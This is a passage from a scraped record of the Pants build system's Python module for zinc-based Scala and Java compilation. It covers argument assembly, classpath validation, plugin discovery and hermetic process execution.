compile_context in compile_contexts: with open(compile_context.zinc_args_file, 'r') as fp: args=fp.read().split() zinc_args[compile_context.target]=args def create_empty_extra_products(self): if self.context.products.is_required_data('zinc_analysis'): self.context.products.safe_create_data('zinc_analysis', dict) if self.context.products.is_required_data('zinc_args'): self.context.products.safe_create_data('zinc_args', lambda: defaultdict(list)) def javac_classpath(self): return Java.global_javac_classpath(self.context.products) def scalac_classpath(self): return ScalaPlatform.global_instance().compiler_classpath(self.context.products) def write_extra_resources(self, compile_context): \"\"\"Override write_extra_resources to produce plugin and annotation processor files.\"\"\" target=compile_context.target if isinstance(target, ScalacPlugin): self._write_scalac_plugin_info(compile_context.classes_dir, target) elif isinstance(target, JavacPlugin): self._write_javac_plugin_info(compile_context.classes_dir, target) elif isinstance(target, AnnotationProcessor) and target.processors: processor_info_file=os.path.join(compile_context.classes_dir, _PROCESSOR_INFO_FILE) self._write_processor_info(processor_info_file, target.processors) def _write_processor_info(self, processor_info_file, processors): with safe_open(processor_info_file, 'w') as f: for processor in processors: f.write('{}\\n'.format(processor.strip())) @memoized_property def _zinc_cache_dir(self): \"\"\"A directory where zinc can store compiled copies of the `compiler-bridge`. The compiler-bridge is specific to each scala version, and is lazily computed by zinc if the appropriate version does not exist. Eventually it would be great to just fetch this rather than compiling it. \"\"\" hasher=sha1() for cp_entry in[self._zinc.zinc, self._zinc.compiler_interface, self._zinc.compiler_bridge]: hasher.update(os.path.relpath(cp_entry, self.get_options().pants_workdir)) key=hasher.hexdigest()[:12] return os.path.join(self.get_options().pants_bootstrapdir, 'zinc', key) def compile(self, ctx, args, dependency_classpath, upstream_analysis, settings, compiler_option_sets, zinc_file_manager, javac_plugin_map, scalac_plugin_map): absolute_classpath=(ctx.classes_dir,) +tuple(ce.path for ce in dependency_classpath) if self.get_options().capture_classpath: self._record_compile_classpath(absolute_classpath, ctx.target, ctx.classes_dir) self._verify_zinc_classpath(absolute_classpath, allow_dist=(self.execution_strategy !=self.HERMETIC)) self._verify_zinc_classpath(upstream_analysis.keys()) def relative_to_exec_root(path): return fast_relpath(path, get_buildroot()) scala_path=self.scalac_classpath() compiler_interface=self._zinc.compiler_interface compiler_bridge=self._zinc.compiler_bridge classes_dir=ctx.classes_dir analysis_cache=ctx.analysis_file scala_path=tuple(relative_to_exec_root(c) for c in scala_path) compiler_interface=relative_to_exec_root(compiler_interface) compiler_bridge=relative_to_exec_root(compiler_bridge) analysis_cache=relative_to_exec_root(analysis_cache) classes_dir=relative_to_exec_root(classes_dir) relative_classpath=tuple(relative_to_exec_root(c) for c in absolute_classpath) zinc_args=[] zinc_args.extend([ '-log-level', self.get_options().level, '-analysis-cache', analysis_cache, '-classpath', ':'.join(relative_classpath), '-d', classes_dir, ]) if not self.get_options().colors: zinc_args.append('-no-color') zinc_args.extend(['-compiler-interface', compiler_interface]) zinc_args.extend(['-compiler-bridge', compiler_bridge]) zinc_args.extend(['-zinc-cache-dir', self._zinc_cache_dir]) zinc_args.extend(['-scala-path', ':'.join(scala_path)]) zinc_args.extend(self._javac_plugin_args(javac_plugin_map)) scalac_plugin_search_classpath=( (set(absolute_classpath) | set(self.scalac_plugin_classpath_elements())) - {ctx.classes_dir, ctx.jar_file} ) zinc_args.extend(self._scalac_plugin_args(scalac_plugin_map, scalac_plugin_search_classpath)) if upstream_analysis: zinc_args.extend(['-analysis-map', ','.join('{}:{}'.format( relative_to_exec_root(k), relative_to_exec_root(v) ) for k, v in upstream_analysis.items())]) zinc_args.extend(self._zinc.rebase_map_args) zinc_args.extend(args) zinc_args.extend(self._get_zinc_arguments(settings)) zinc_args.append('-transactional') for option_set in compiler_option_sets: enabled_args=self.get_options().compiler_option_sets_enabled_args.get(option_set,[]) if option_set=='fatal_warnings': enabled_args=self.get_options().fatal_warnings_enabled_args zinc_args.extend(enabled_args) for option_set, disabled_args in self.get_options().compiler_option_sets_disabled_args.items(): if option_set not in compiler_option_sets: if option_set=='fatal_warnings': disabled_args=self.get_options().fatal_warnings_disabled_args zinc_args.extend(disabled_args) if not self._clear_invalid_analysis: zinc_args.append('-no-clear-invalid-analysis') if not zinc_file_manager: zinc_args.append('-no-zinc-file-manager') jvm_options=[] if self.javac_classpath(): jvm_options.extend(['-Xbootclasspath/p:{}'.format(':'.join(self.javac_classpath()))]) jvm_options.extend(self._jvm_options) zinc_args.extend(ctx.sources) self.log_zinc_file(ctx.analysis_file) with open(ctx.zinc_args_file, 'wb') as fp: for arg in zinc_args: fp.write(arg) fp.write(b'\\n') if self.execution_strategy==self.HERMETIC: zinc_relpath=fast_relpath(self._zinc.zinc, get_buildroot()) snapshots=[ self._zinc.snapshot(self.context._scheduler), ctx.target.sources_snapshot(self.context._scheduler), ] directory_digests=tuple( entry.directory_digest for entry in dependency_classpath if entry.directory_digest ) if len(directory_digests) !=len(dependency_classpath): for dep in dependency_classpath: if dep.directory_digest is None: logger.warning( \"ClasspathEntry{} didn't have a DirectoryDigest, so won't be present for hermetic \" \"execution\".format(dep) ) if scala_path: snapshots.append( self.context._scheduler.capture_snapshots((PathGlobsAndRoot( PathGlobs(scala_path), get_buildroot(), ),))[0] ) merged_input_digest=self.context._scheduler.merge_directories( tuple(s.directory_digest for s in(snapshots)) +directory_digests ) argv=tuple(['.jdk/bin/java'] +jvm_options +['-cp', zinc_relpath, Zinc.ZINC_COMPILE_MAIN] +zinc_args) req=ExecuteProcessRequest( argv=argv, input_files=merged_input_digest, output_files=(analysis_cache,), output_directories=(classes_dir,), description=\"zinc compile for{}\".format(ctx.target.address.spec), jdk_home=text_type(self._zinc.dist.home), ) res=self.context.execute_process_synchronously(req, self.name(),[WorkUnitLabel.COMPILER]) self.context._scheduler.materialize_directories(( DirectoryToMaterialize(get_buildroot(), res.output_directory_digest), )) return res.output_directory_digest else: if self.runjava(classpath=[self._zinc.zinc], main=Zinc.ZINC_COMPILE_MAIN, jvm_options=jvm_options, args=zinc_args, workunit_name=self.name(), workunit_labels=[WorkUnitLabel.COMPILER], dist=self._zinc.dist): raise TaskError('Zinc compile failed.') def _verify_zinc_classpath(self, classpath, allow_dist=True): def is_outside(path, putative_parent): return os.path.relpath(path, putative_parent).startswith(os.pardir) dist=self._zinc.dist for path in classpath: if not os.path.isabs(path): raise TaskError('Classpath entries provided to zinc should be absolute. ' '{} is not.'.format(path)) if is_outside(path, self.get_options().pants_workdir) and(not allow_dist or is_outside(path, dist.home)): raise TaskError('Classpath entries provided to zinc should be in working directory or ' 'part of the JDK.{} is not.'.format(path)) if path !=os.path.normpath(path): raise TaskError('Classpath entries provided to zinc should be normalized ' '(i.e. without \"..\" and \".\").{} is not.'.format(path)) def log_zinc_file(self, analysis_file): self.context.log.debug('Calling zinc on:{}({})' .format(analysis_file, hash_file(analysis_file).upper() if os.path.exists(analysis_file) else 'nonexistent')) @classmethod def _javac_plugin_args(cls, javac_plugin_map): ret=[] for plugin, args in javac_plugin_map.items(): for arg in args: if ' ' in arg: raise TaskError('javac plugin args must not contain spaces ' '(arg{} for plugin{})'.format(arg, plugin)) ret.append('-C-Xplugin:{}{}'.format(plugin, ' '.join(args))) return ret def _scalac_plugin_args(self, scalac_plugin_map, classpath): if not scalac_plugin_map: return[] plugin_jar_map=self._find_scalac_plugins(list(scalac_plugin_map.keys()), classpath) ret=[] for name, cp_entries in plugin_jar_map.items(): ret.append('-S-Xplugin:{}'.format(':'.join(cp_entries))) for arg in scalac_plugin_map[name]: ret.append('-S-P:{}:{}'.format(name, arg)) return ret def _find_scalac_plugins(self, scalac_plugins, classpath): \"\"\"Returns a map from plugin name to list of plugin classpath entries. The first entry in each list is the classpath entry containing the plugin metadata. The rest are the internal transitive deps of the plugin. This allows us to have in-repo plugins with dependencies(unlike javac, scalac doesn't load plugins or their deps from the regular classpath, so we have to provide these entries separately, in the -Xplugin: flag). Note that we don't currently support external plugins with dependencies, as we can't know which external classpath elements are required, and we'd have to put the entire external classpath on each -Xplugin: flag, which seems excessive. Instead, external plugins should be published as \"fat jars\"(which appears to be the norm, since SBT doesn't support plugins with dependencies anyway). \"\"\" plugin_names={p for val in scalac_plugins for p in val.split(',')} if not plugin_names: return{} active_plugins={} buildroot=get_buildroot() cp_product=self.context.products.get_data('runtime_classpath') for classpath_element in classpath: name=self._maybe_get_plugin_name(classpath_element) if name in plugin_names: plugin_target_closure=self._plugin_targets('scalac').get(name,[]) rel_classpath_elements=[ os.path.relpath(cpe, buildroot) for cpe in ClasspathUtil.internal_classpath(plugin_target_closure, cp_product, self._confs)] rel_classpath_elements=rel_classpath_elements or[classpath_element] if active_plugins.get(name, rel_classpath_elements) !=rel_classpath_elements: raise TaskError('Plugin{} defined in{} and in{}'.format(name, active_plugins[name], classpath_element)) active_plugins[name]=rel_classpath_elements if len(active_plugins)==len(plugin_names): return active_plugins unresolved_plugins=plugin_names -set(active_plugins.keys()) raise TaskError('Could not find requested plugins:{}'.format(list(unresolved_plugins))) @classmethod @memoized_method def _maybe_get_plugin_name(cls, classpath_element): \"\"\"If classpath_element is a scalac plugin, returns its name. Returns None otherwise. \"\"\" def process_info_file(cp_elem, info_file): plugin_info=ElementTree.parse(info_file).getroot() if plugin_info.tag !='plugin': raise TaskError('File{} in{} is not a valid scalac plugin descriptor'.format( _SCALAC_PLUGIN_INFO_FILE, cp_elem)) return plugin_info.find('name').text if os.path.isdir(classpath_element): try: with open(os.path.join(classpath_element, _SCALAC_PLUGIN_INFO_FILE), 'r') as plugin_info_file: return process_info_file(classpath_element, plugin_info_file) except IOError as e: if e.errno !=errno.ENOENT: raise else: with open_zip(classpath_element, 'r') as jarfile: try: with closing(jarfile.open(_SCALAC_PLUGIN_INFO_FILE, 'r')) as plugin_info_file: return process_info_file(classpath_element, plugin_info_file) except KeyError: pass return None class ZincCompile(BaseZincCompile): \"\"\"Compile Scala and Java code to classfiles using Zinc.\"\"\" @classmethod def product_types(cls): return['runtime_classpath', 'zinc_analysis', 'zinc_args'] def select(self, target): if not isinstance(target, JvmTarget): return False return target.has_sources('.java') or target.has_sources('.scala') def select_source(self, source_file_path): return source_file_path.endswith('.java') or source_file_path.endswith('.scala') def execute(self): if JvmPlatform.global_instance().get_options().compiler=='zinc': return super(ZincCompile, self).execute() ", "sourceWithComments": "# coding=utf-8\n# Copyright 2014 Pants project contributors (see CONTRIBUTORS.md).\n# Licensed under the Apache License, Version 2.0 (see LICENSE).\n\nfrom __future__ import absolute_import, division, print_function, unicode_literals\n\nimport errno\nimport logging\nimport os\nimport re\nimport textwrap\nfrom builtins import open\nfrom collections import defaultdict\nfrom contextlib import closing\nfrom hashlib import sha1\nfrom xml.etree import ElementTree\n\nfrom future.utils import PY3, text_type\n\nfrom pants.backend.jvm.subsystems.java import Java\nfrom pants.backend.jvm.subsystems.jvm_platform import JvmPlatform\nfrom pants.backend.jvm.subsystems.scala_platform import ScalaPlatform\nfrom pants.backend.jvm.subsystems.zinc import Zinc\nfrom pants.backend.jvm.targets.annotation_processor import AnnotationProcessor\nfrom pants.backend.jvm.targets.javac_plugin import JavacPlugin\nfrom pants.backend.jvm.targets.jvm_target import JvmTarget\nfrom pants.backend.jvm.targets.scalac_plugin import ScalacPlugin\nfrom pants.backend.jvm.tasks.classpath_util import ClasspathUtil\nfrom pants.backend.jvm.tasks.jvm_compile.jvm_compile import JvmCompile\nfrom pants.base.build_environment import get_buildroot\nfrom pants.base.exceptions import TaskError\nfrom pants.base.hash_utils import hash_file\nfrom pants.base.workunit import WorkUnitLabel\nfrom pants.engine.fs import DirectoryToMaterialize, PathGlobs, PathGlobsAndRoot\nfrom pants.engine.isolated_process import ExecuteProcessRequest\nfrom pants.java.distribution.distribution import DistributionLocator\nfrom pants.util.contextutil import open_zip\nfrom pants.util.dirutil import fast_relpath, safe_open\nfrom pants.util.memo import memoized_method, memoized_property\n\n\n# Well known metadata file required to register scalac plugins with nsc.\n_SCALAC_PLUGIN_INFO_FILE = 'scalac-plugin.xml'\n\n# Well known metadata file to register javac plugins.\n_JAVAC_PLUGIN_INFO_FILE = 'META-INF/services/com.sun.source.util.Plugin'\n\n# Well known metadata file to register annotation processors with a java 1.6+ compiler.\n_PROCESSOR_INFO_FILE = 'META-INF/services/javax.annotation.processing.Processor'\n\n\nlogger = logging.getLogger(__name__)\n\n\nclass BaseZincCompile(JvmCompile):\n  \"\"\"An abstract base class for zinc compilation tasks.\"\"\"\n\n  _name = 'zinc'\n\n  @staticmethod\n  def _write_scalac_plugin_info(resources_dir, scalac_plugin_target):\n    scalac_plugin_info_file = os.path.join(resources_dir, _SCALAC_PLUGIN_INFO_FILE)\n    with safe_open(scalac_plugin_info_file, 'w') as f:\n      f.write(textwrap.dedent(\"\"\"\n        <plugin>\n          <name>{}</name>\n          <classname>{}</classname>\n        </plugin>\n      \"\"\".format(scalac_plugin_target.plugin, scalac_plugin_target.classname)).strip())\n\n  @staticmethod\n  def _write_javac_plugin_info(resources_dir, javac_plugin_target):\n    javac_plugin_info_file = os.path.join(resources_dir, _JAVAC_PLUGIN_INFO_FILE)\n    with safe_open(javac_plugin_info_file, 'w') as f:\n      classname = javac_plugin_target.classname if PY3 else javac_plugin_target.classname.decode('utf-8')\n      f.write(classname)\n\n  @staticmethod\n  def validate_arguments(log, whitelisted_args, args):\n    \"\"\"Validate that all arguments match whitelisted regexes.\"\"\"\n    valid_patterns = {re.compile(p): v for p, v in whitelisted_args.items()}\n\n    def validate(idx):\n      arg = args[idx]\n      for pattern, has_argument in valid_patterns.items():\n        if pattern.match(arg):\n          return 2 if has_argument else 1\n      log.warn(\"Zinc argument '{}' is not supported, and is subject to change/removal!\".format(arg))\n      return 1\n\n    arg_index = 0\n    while arg_index < len(args):\n      arg_index += validate(arg_index)\n\n  @staticmethod\n  def _get_zinc_arguments(settings):\n    \"\"\"Extracts and formats the zinc arguments given in the jvm platform settings.\n\n    This is responsible for the symbol substitution which replaces $JAVA_HOME with the path to an\n    appropriate jvm distribution.\n\n    :param settings: The jvm platform settings from which to extract the arguments.\n    :type settings: :class:`JvmPlatformSettings`\n    \"\"\"\n    zinc_args = [\n      '-C-source', '-C{}'.format(settings.source_level),\n      '-C-target', '-C{}'.format(settings.target_level),\n    ]\n    if settings.args:\n      settings_args = settings.args\n      if any('$JAVA_HOME' in a for a in settings.args):\n        try:\n          distribution = JvmPlatform.preferred_jvm_distribution([settings], strict=True)\n        except DistributionLocator.Error:\n          distribution = JvmPlatform.preferred_jvm_distribution([settings], strict=False)\n        logger.debug('Substituting \"$JAVA_HOME\" with \"{}\" in jvm-platform args.'\n                     .format(distribution.home))\n        settings_args = (a.replace('$JAVA_HOME', distribution.home) for a in settings.args)\n      zinc_args.extend(settings_args)\n    return zinc_args\n\n  @classmethod\n  def implementation_version(cls):\n    return super(BaseZincCompile, cls).implementation_version() + [('BaseZincCompile', 7)]\n\n  @classmethod\n  def get_jvm_options_default(cls, bootstrap_option_values):\n    return ('-Dfile.encoding=UTF-8', '-Dzinc.analysis.cache.limit=1000',\n            '-Djava.awt.headless=true', '-Xmx2g')\n\n  @classmethod\n  def get_args_default(cls, bootstrap_option_values):\n    return ('-C-encoding', '-CUTF-8', '-S-encoding', '-SUTF-8', '-S-g:vars')\n\n  @classmethod\n  def get_warning_args_default(cls):\n    return ('-C-deprecation', '-C-Xlint:all', '-C-Xlint:-serial', '-C-Xlint:-path',\n            '-S-deprecation', '-S-unchecked', '-S-Xlint')\n\n  @classmethod\n  def get_no_warning_args_default(cls):\n    return ('-C-nowarn', '-C-Xlint:none', '-S-nowarn', '-S-Xlint:none', )\n\n  @classmethod\n  def get_fatal_warnings_enabled_args_default(cls):\n    return ('-S-Xfatal-warnings', '-C-Werror')\n\n  @classmethod\n  def get_fatal_warnings_disabled_args_default(cls):\n    return ()\n\n  @classmethod\n  def register_options(cls, register):\n    super(BaseZincCompile, cls).register_options(register)\n    register('--whitelisted-args', advanced=True, type=dict,\n             default={\n               '-S.*': False,\n               '-C.*': False,\n               '-file-filter': True,\n               '-msg-filter': True,\n               },\n             help='A dict of option regexes that make up pants\\' supported API for zinc. '\n                  'Options not listed here are subject to change/removal. The value of the dict '\n                  'indicates that an option accepts an argument.')\n\n    register('--incremental', advanced=True, type=bool, default=True,\n             help='When set, zinc will use sub-target incremental compilation, which dramatically '\n                  'improves compile performance while changing large targets. When unset, '\n                  'changed targets will be compiled with an empty output directory, as if after '\n                  'running clean-all.')\n\n    register('--incremental-caching', advanced=True, type=bool,\n             help='When set, the results of incremental compiles will be written to the cache. '\n                  'This is unset by default, because it is generally a good precaution to cache '\n                  'only clean/cold builds.')\n\n  @classmethod\n  def subsystem_dependencies(cls):\n    return super(BaseZincCompile, cls).subsystem_dependencies() + (Zinc.Factory, JvmPlatform,)\n\n  @classmethod\n  def prepare(cls, options, round_manager):\n    super(BaseZincCompile, cls).prepare(options, round_manager)\n    ScalaPlatform.prepare_tools(round_manager)\n\n  @property\n  def incremental(self):\n    \"\"\"Zinc implements incremental compilation.\n\n    Setting this property causes the task infrastructure to clone the previous\n    results_dir for a target into the new results_dir for a target.\n    \"\"\"\n    return self.get_options().incremental\n\n  @property\n  def cache_incremental(self):\n    \"\"\"Optionally write the results of incremental compiles to the cache.\"\"\"\n    return self.get_options().incremental_caching\n\n  @memoized_property\n  def _zinc(self):\n    return Zinc.Factory.global_instance().create(self.context.products)\n\n  def __init__(self, *args, **kwargs):\n    super(BaseZincCompile, self).__init__(*args, **kwargs)\n    # A directory to contain per-target subdirectories with apt processor info files.\n    self._processor_info_dir = os.path.join(self.workdir, 'apt-processor-info')\n\n    # Validate zinc options.\n    ZincCompile.validate_arguments(self.context.log, self.get_options().whitelisted_args,\n                                   self._args)\n    if self.execution_strategy == self.HERMETIC:\n      try:\n        fast_relpath(self.get_options().pants_workdir, get_buildroot())\n      except ValueError:\n        raise TaskError(\n          \"Hermetic zinc execution currently requires the workdir to be a child of the buildroot \"\n          \"but workdir was {} and buildroot was {}\".format(\n            self.get_options().pants_workdir,\n            get_buildroot(),\n          )\n        )\n\n      if self.get_options().use_classpath_jars:\n        # TODO: Make this work by capturing the correct DirectoryDigest and passing them around the\n        # right places.\n        # See https://github.com/pantsbuild/pants/issues/6432\n        raise TaskError(\"Hermetic zinc execution currently doesn't work with classpath jars\")\n\n  def select(self, target):\n    raise NotImplementedError()\n\n  def select_source(self, source_file_path):\n    raise NotImplementedError()\n\n  def register_extra_products_from_contexts(self, targets, compile_contexts):\n    compile_contexts = [self.select_runtime_context(compile_contexts[t]) for t in targets]\n    zinc_analysis = self.context.products.get_data('zinc_analysis')\n    zinc_args = self.context.products.get_data('zinc_args')\n\n    if zinc_analysis is not None:\n      for compile_context in compile_contexts:\n        zinc_analysis[compile_context.target] = (compile_context.classes_dir,\n        compile_context.jar_file,\n        compile_context.analysis_file)\n\n    if zinc_args is not None:\n      for compile_context in compile_contexts:\n        with open(compile_context.zinc_args_file, 'r') as fp:\n          args = fp.read().split()\n        zinc_args[compile_context.target] = args\n\n  def create_empty_extra_products(self):\n    if self.context.products.is_required_data('zinc_analysis'):\n      self.context.products.safe_create_data('zinc_analysis', dict)\n\n    if self.context.products.is_required_data('zinc_args'):\n      self.context.products.safe_create_data('zinc_args', lambda: defaultdict(list))\n\n  def javac_classpath(self):\n    # Note that if this classpath is empty then Zinc will automatically use the javac from\n    # the JDK it was invoked with.\n    return Java.global_javac_classpath(self.context.products)\n\n  def scalac_classpath(self):\n    return ScalaPlatform.global_instance().compiler_classpath(self.context.products)\n\n  def write_extra_resources(self, compile_context):\n    \"\"\"Override write_extra_resources to produce plugin and annotation processor files.\"\"\"\n    target = compile_context.target\n    if isinstance(target, ScalacPlugin):\n      self._write_scalac_plugin_info(compile_context.classes_dir, target)\n    elif isinstance(target, JavacPlugin):\n      self._write_javac_plugin_info(compile_context.classes_dir, target)\n    elif isinstance(target, AnnotationProcessor) and target.processors:\n      processor_info_file = os.path.join(compile_context.classes_dir, _PROCESSOR_INFO_FILE)\n      self._write_processor_info(processor_info_file, target.processors)\n\n  def _write_processor_info(self, processor_info_file, processors):\n    with safe_open(processor_info_file, 'w') as f:\n      for processor in processors:\n        f.write('{}\\n'.format(processor.strip()))\n\n  @memoized_property\n  def _zinc_cache_dir(self):\n    \"\"\"A directory where zinc can store compiled copies of the `compiler-bridge`.\n\n    The compiler-bridge is specific to each scala version, and is lazily computed by zinc if the\n    appropriate version does not exist. Eventually it would be great to just fetch this rather\n    than compiling it.\n    \"\"\"\n    hasher = sha1()\n    for cp_entry in [self._zinc.zinc, self._zinc.compiler_interface, self._zinc.compiler_bridge]:\n      hasher.update(os.path.relpath(cp_entry, self.get_options().pants_workdir))\n    key = hasher.hexdigest()[:12]\n    return os.path.join(self.get_options().pants_bootstrapdir, 'zinc', key)\n\n  def compile(self, ctx, args, dependency_classpath, upstream_analysis,\n              settings, compiler_option_sets, zinc_file_manager,\n              javac_plugin_map, scalac_plugin_map):\n    absolute_classpath = (ctx.classes_dir,) + tuple(ce.path for ce in dependency_classpath)\n\n    if self.get_options().capture_classpath:\n      self._record_compile_classpath(absolute_classpath, ctx.target, ctx.classes_dir)\n\n    # TODO: Allow use of absolute classpath entries with hermetic execution,\n    # specifically by using .jdk dir for Distributions:\n    # https://github.com/pantsbuild/pants/issues/6430\n    self._verify_zinc_classpath(absolute_classpath, allow_dist=(self.execution_strategy != self.HERMETIC))\n    # TODO: Investigate upstream_analysis for hermetic compiles\n    self._verify_zinc_classpath(upstream_analysis.keys())\n\n    def relative_to_exec_root(path):\n      # TODO: Support workdirs not nested under buildroot by path-rewriting.\n      return fast_relpath(path, get_buildroot())\n\n    scala_path = self.scalac_classpath()\n    compiler_interface = self._zinc.compiler_interface\n    compiler_bridge = self._zinc.compiler_bridge\n    classes_dir = ctx.classes_dir\n    analysis_cache = ctx.analysis_file\n\n    scala_path = tuple(relative_to_exec_root(c) for c in scala_path)\n    compiler_interface = relative_to_exec_root(compiler_interface)\n    compiler_bridge = relative_to_exec_root(compiler_bridge)\n    analysis_cache = relative_to_exec_root(analysis_cache)\n    classes_dir = relative_to_exec_root(classes_dir)\n    # TODO: Have these produced correctly, rather than having to relativize them here\n    relative_classpath = tuple(relative_to_exec_root(c) for c in absolute_classpath)\n\n    zinc_args = []\n    zinc_args.extend([\n      '-log-level', self.get_options().level,\n      '-analysis-cache', analysis_cache,\n      '-classpath', ':'.join(relative_classpath),\n      '-d', classes_dir,\n    ])\n    if not self.get_options().colors:\n      zinc_args.append('-no-color')\n\n    zinc_args.extend(['-compiler-interface', compiler_interface])\n    zinc_args.extend(['-compiler-bridge', compiler_bridge])\n    # TODO: Kill zinc-cache-dir: https://github.com/pantsbuild/pants/issues/6155\n    # But for now, this will probably fail remotely because the homedir probably doesn't exist.\n    zinc_args.extend(['-zinc-cache-dir', self._zinc_cache_dir])\n    zinc_args.extend(['-scala-path', ':'.join(scala_path)])\n\n    zinc_args.extend(self._javac_plugin_args(javac_plugin_map))\n    # Search for scalac plugins on the classpath.\n    # Note that:\n    # - We also search in the extra scalac plugin dependencies, if specified.\n    # - In scala 2.11 and up, the plugin's classpath element can be a dir, but for 2.10 it must be\n    #   a jar.  So in-repo plugins will only work with 2.10 if --use-classpath-jars is true.\n    # - We exclude our own classes_dir/jar_file, because if we're a plugin ourselves, then our\n    #   classes_dir doesn't have scalac-plugin.xml yet, and we don't want that fact to get\n    #   memoized (which in practice will only happen if this plugin uses some other plugin, thus\n    #   triggering the plugin search mechanism, which does the memoizing).\n    scalac_plugin_search_classpath = (\n      (set(absolute_classpath) | set(self.scalac_plugin_classpath_elements())) -\n      {ctx.classes_dir, ctx.jar_file}\n    )\n    zinc_args.extend(self._scalac_plugin_args(scalac_plugin_map, scalac_plugin_search_classpath))\n    if upstream_analysis:\n      zinc_args.extend(['-analysis-map',\n                        ','.join('{}:{}'.format(\n                          relative_to_exec_root(k),\n                          relative_to_exec_root(v)\n                        ) for k, v in upstream_analysis.items())])\n\n    zinc_args.extend(self._zinc.rebase_map_args)\n\n    zinc_args.extend(args)\n    zinc_args.extend(self._get_zinc_arguments(settings))\n    zinc_args.append('-transactional')\n\n    for option_set in compiler_option_sets:\n      enabled_args = self.get_options().compiler_option_sets_enabled_args.get(option_set, [])\n      if option_set == 'fatal_warnings':\n        enabled_args = self.get_options().fatal_warnings_enabled_args\n      zinc_args.extend(enabled_args)\n\n    for option_set, disabled_args in self.get_options().compiler_option_sets_disabled_args.items():\n      if option_set not in compiler_option_sets:\n        if option_set == 'fatal_warnings':\n          disabled_args = self.get_options().fatal_warnings_disabled_args\n        zinc_args.extend(disabled_args)\n\n    if not self._clear_invalid_analysis:\n      zinc_args.append('-no-clear-invalid-analysis')\n\n    if not zinc_file_manager:\n      zinc_args.append('-no-zinc-file-manager')\n\n    jvm_options = []\n\n    if self.javac_classpath():\n      # Make the custom javac classpath the first thing on the bootclasspath, to ensure that\n      # it's the one javax.tools.ToolProvider.getSystemJavaCompiler() loads.\n      # It will probably be loaded even on the regular classpath: If not found on the bootclasspath,\n      # getSystemJavaCompiler() constructs a classloader that loads from the JDK's tools.jar.\n      # That classloader will first delegate to its parent classloader, which will search the\n      # regular classpath.  However it's harder to guarantee that our javac will preceed any others\n      # on the classpath, so it's safer to prefix it to the bootclasspath.\n      jvm_options.extend(['-Xbootclasspath/p:{}'.format(':'.join(self.javac_classpath()))])\n\n    jvm_options.extend(self._jvm_options)\n\n    zinc_args.extend(ctx.sources)\n\n    self.log_zinc_file(ctx.analysis_file)\n    with open(ctx.zinc_args_file, 'wb') as fp:\n      for arg in zinc_args:\n        fp.write(arg)\n        fp.write(b'\\n')\n\n    if self.execution_strategy == self.HERMETIC:\n      zinc_relpath = fast_relpath(self._zinc.zinc, get_buildroot())\n\n      snapshots = [\n        self._zinc.snapshot(self.context._scheduler),\n        ctx.target.sources_snapshot(self.context._scheduler),\n      ]\n\n      directory_digests = tuple(\n        entry.directory_digest for entry in dependency_classpath if entry.directory_digest\n      )\n      if len(directory_digests) != len(dependency_classpath):\n        for dep in dependency_classpath:\n          if dep.directory_digest is None:\n            logger.warning(\n              \"ClasspathEntry {} didn't have a DirectoryDigest, so won't be present for hermetic \"\n              \"execution\".format(dep)\n            )\n\n      if scala_path:\n        # TODO: ScalaPlatform._tool_classpath should capture this and memoize it.\n        # See https://github.com/pantsbuild/pants/issues/6435\n        snapshots.append(\n          self.context._scheduler.capture_snapshots((PathGlobsAndRoot(\n            PathGlobs(scala_path),\n            get_buildroot(),\n          ),))[0]\n        )\n\n      merged_input_digest = self.context._scheduler.merge_directories(\n        tuple(s.directory_digest for s in (snapshots)) + directory_digests\n      )\n\n      # TODO: Extract something common from Executor._create_command to make the command line\n      # TODO: Lean on distribution for the bin/java appending here\n      argv = tuple(['.jdk/bin/java'] + jvm_options + ['-cp', zinc_relpath, Zinc.ZINC_COMPILE_MAIN] + zinc_args)\n      req = ExecuteProcessRequest(\n        argv=argv,\n        input_files=merged_input_digest,\n        output_files=(analysis_cache,),\n        output_directories=(classes_dir,),\n        description=\"zinc compile for {}\".format(ctx.target.address.spec),\n        # TODO: These should always be unicodes\n        jdk_home=text_type(self._zinc.dist.home),\n      )\n      res = self.context.execute_process_synchronously(req, self.name(), [WorkUnitLabel.COMPILER])\n      # TODO: Materialize as a batch in do_compile or somewhere\n      self.context._scheduler.materialize_directories((\n        DirectoryToMaterialize(get_buildroot(), res.output_directory_digest),\n      ))\n\n      # TODO: This should probably return a ClasspathEntry rather than a DirectoryDigest\n      return res.output_directory_digest\n    else:\n      if self.runjava(classpath=[self._zinc.zinc],\n                      main=Zinc.ZINC_COMPILE_MAIN,\n                      jvm_options=jvm_options,\n                      args=zinc_args,\n                      workunit_name=self.name(),\n                      workunit_labels=[WorkUnitLabel.COMPILER],\n                      dist=self._zinc.dist):\n        raise TaskError('Zinc compile failed.')\n\n  def _verify_zinc_classpath(self, classpath, allow_dist=True):\n    def is_outside(path, putative_parent):\n      return os.path.relpath(path, putative_parent).startswith(os.pardir)\n\n    dist = self._zinc.dist\n    for path in classpath:\n      if not os.path.isabs(path):\n        raise TaskError('Classpath entries provided to zinc should be absolute. '\n                        '{} is not.'.format(path))\n\n      if is_outside(path, self.get_options().pants_workdir) and (not allow_dist or is_outside(path, dist.home)):\n        raise TaskError('Classpath entries provided to zinc should be in working directory or '\n                        'part of the JDK. {} is not.'.format(path))\n      if path != os.path.normpath(path):\n        raise TaskError('Classpath entries provided to zinc should be normalized '\n                        '(i.e. without \"..\" and \".\"). {} is not.'.format(path))\n\n  def log_zinc_file(self, analysis_file):\n    self.context.log.debug('Calling zinc on: {} ({})'\n                           .format(analysis_file,\n                                   hash_file(analysis_file).upper()\n                                   if os.path.exists(analysis_file)\n                                   else 'nonexistent'))\n\n  @classmethod\n  def _javac_plugin_args(cls, javac_plugin_map):\n    ret = []\n    for plugin, args in javac_plugin_map.items():\n      for arg in args:\n        if ' ' in arg:\n          # Note: Args are separated by spaces, and there is no way to escape embedded spaces, as\n          # javac's Main does a simple split on these strings.\n          raise TaskError('javac plugin args must not contain spaces '\n                          '(arg {} for plugin {})'.format(arg, plugin))\n      ret.append('-C-Xplugin:{} {}'.format(plugin, ' '.join(args)))\n    return ret\n\n  def _scalac_plugin_args(self, scalac_plugin_map, classpath):\n    if not scalac_plugin_map:\n      return []\n\n    plugin_jar_map = self._find_scalac_plugins(list(scalac_plugin_map.keys()), classpath)\n    ret = []\n    for name, cp_entries in plugin_jar_map.items():\n      # Note that the first element in cp_entries is the one containing the plugin's metadata,\n      # meaning that this is the plugin that will be loaded, even if there happen to be other\n      # plugins in the list of entries (e.g., because this plugin depends on another plugin).\n      ret.append('-S-Xplugin:{}'.format(':'.join(cp_entries)))\n      for arg in scalac_plugin_map[name]:\n        ret.append('-S-P:{}:{}'.format(name, arg))\n    return 